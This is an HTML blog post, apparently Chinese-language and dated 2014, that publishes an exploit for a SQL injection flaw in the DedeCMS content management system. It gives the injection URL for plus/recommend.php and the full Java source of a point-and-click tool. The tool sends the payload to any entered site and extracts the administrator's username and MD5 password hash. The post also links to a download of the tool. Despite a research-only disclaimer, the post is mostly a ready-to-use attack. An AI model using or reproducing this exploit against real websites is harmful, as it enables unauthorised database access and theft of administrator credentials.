@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>DedeCMS全版本通杀SQL注入漏洞利用代码及工具</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>DedeCMS全版本通杀SQL注入漏洞利用代码及工具</h2>
+	<p class="meta">2014-02-28</p>
+
+	<div class="post">
+	        <p></p>
+<p style="text-align: center;"><img data-original="/imgs/05d5382d481b910e8b7adb623b3f7428.jpg!small" src="/imgs/05d5382d481b910e8b7adb623b3f7428.jpg!small" title="19300000229465130648248997758.jpg"></p>
+<noscript><img src="/imgs/05d5382d481b910e8b7adb623b3f7428.jpg!small" title="19300000229465130648248997758.jpg"></noscript>
+<p>dedecms即织梦（PHP开源网站内容管理系统）。织梦内容管理系统(DedeCms) 以简单、实用、开源而闻名，是国内最知名的PHP开源网站管理系统，也是使用用户最多的PHP类CMS系统，<strong>近日，网友在dedecms中发现了全版本通杀的SQL注入漏洞，目前官方最新版已修复该漏洞，相关利用代码如下：</strong></p>
+<p>EXP:</p>
+<pre class="prettyprint lang-html">Exp:plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\'
+  or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select  
+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` 
+limit+0,1),5,6,7,8,9%23@`\'`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type]
+ [type]=application/octet-stream&amp;_FILES[type][size]=111</pre>
+<p>利用工具源码(by 园长)：</p>
+<pre class="prettyprint lang-java">package org.javaweb.dede.ui;
+  
+import java.awt.Toolkit;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+  
+/**
+ *
+ * @author yz
+ */
+public class MainFrame extends javax.swing.JFrame {
+  
+    private static final long serialVersionUID = 1L;
+  
+    /**
+     * Creates new form MainFrame
+     */
+    public MainFrame() {
+        initComponents();
+    }
+  
+    public String request(String url){
+        String str = "",tmp;
+        try {
+            BufferedReader br = new BufferedReader(new InputStreamReader(new URL(url).openStream()));
+            while((tmp=br.readLine())!=null){
+                str+=tmp+"\r\n";
+            }
+        } catch (Exception e) {
+            jTextArea1.setText(e.toString());
+        }
+        return str;
+    }
+  
+    private void initComponents() {
+  
+        jPanel1 = new javax.swing.JPanel();
+        jLabel1 = new javax.swing.JLabel();
+        jTextField1 = new javax.swing.JTextField();
+        jButton1 = new javax.swing.JButton();
+        jScrollPane1 = new javax.swing.JScrollPane();
+        jTextArea1 = new javax.swing.JTextArea();
+  
+        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
+  
+        jLabel1.setText("URL:");
+        jTextField1.setText("http://localhost");
+  
+        this.setTitle("DedeCms recommend.php注入利用工具-p2j.cn");
+  
+        int screenWidth = Toolkit.getDefaultToolkit().getScreenSize().width;
+        int screenHeight = Toolkit.getDefaultToolkit().getScreenSize().height;
+        this.setBounds(screenWidth / 2 - 229, screenHeight / 2 - 158, 458, 316);
+  
+        jButton1.setText("获取");
+        jButton1.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                jButton1ActionPerformed(evt);
+            }
+        });
+  
+        jTextArea1.setColumns(20);
+        jTextArea1.setRows(5);
+        jScrollPane1.setViewportView(jTextArea1);
+  
+        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
+        jPanel1.setLayout(jPanel1Layout);
+        jPanel1Layout.setHorizontalGroup(
+            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addGroup(jPanel1Layout.createSequentialGroup()
+                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
+                    .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.LEADING)
+                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()
+                        .addContainerGap()
+                        .addComponent(jLabel1)
+                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                        .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 331, javax.swing.GroupLayout.PREFERRED_SIZE)
+                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                        .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 83, javax.swing.GroupLayout.PREFERRED_SIZE)))
+                .addGap(0, 0, Short.MAX_VALUE))
+        );
+        jPanel1Layout.setVerticalGroup(
+            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addGroup(jPanel1Layout.createSequentialGroup()
+                .addContainerGap()
+                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
+                    .addComponent(jLabel1)
+                    .addComponent(jTextField1,
+ javax.swing.GroupLayout.PREFERRED_SIZE, 
+javax.swing.GroupLayout.DEFAULT_SIZE, 
+javax.swing.GroupLayout.PREFERRED_SIZE)
+                    .addComponent(jButton1))
+                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE))
+        );
+  
+        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
+        getContentPane().setLayout(layout);
+        layout.setHorizontalGroup(
+            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+        );
+        layout.setVerticalGroup(
+            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+        );
+  
+        pack();
+    }// &lt;/editor-fold&gt;                       
+  
+    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {                                        
+        String url = jTextField1.getText();
+        if(null==url||"".equals(url)){
+            return ;
+        }
+        String result = request(url+"/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294");
+        Matcher m = Pattern.compile("&lt;h2&gt;(.*)&lt;/h2&gt;").matcher(result);
+        if(m.find()){
+            String[] s = m.group(1).split("\\|");
+            if(s.length&gt;2){
+                jTextArea1.setText("UserName:"+s[1]+"\r\nMD5:"+s[2].substring(3,s[2].length()-1));
+            }
+        }
+    }                                       
+  
+    public static void main(String args[]) {
+        java.awt.EventQueue.invokeLater(new Runnable() {
+            public void run() {
+                new MainFrame().setVisible(true);
+            }
+        });
+    }
+  
+    // Variables declaration - do not modify                    
+    private javax.swing.JButton jButton1;
+    private javax.swing.JLabel jLabel1;
+    private javax.swing.JPanel jPanel1;
+    private javax.swing.JScrollPane jScrollPane1;
+    private javax.swing.JTextArea jTextArea1;
+    private javax.swing.JTextField jTextField1;
+    // End of variables declaration                  
+}</pre>
+<p>利用工具下载地址 <a data_ue_src="http://pan.baidu.com/s/1sj31RLN" title="" target="_blank" href="http://pan.baidu.com/s/1sj31RLN">http://pan.baidu.com/s/1sj31RLN</a> (<span style="color: rgb(192, 0, 0);"><strong>本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!</strong></span>)<br></p>
+<p><img data-original="/imgs/2482424700b364f8fdfb52aeaed2e48b.jpg!small" src="/imgs/05d5382d481b910e8b7adb623b3f7428.jpg!small" height="318" width="460"></p>
+<noscript><img src="/imgs/2482424700b364f8fdfb52aeaed2e48b.jpg!small" height="318" width="460"></noscript>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
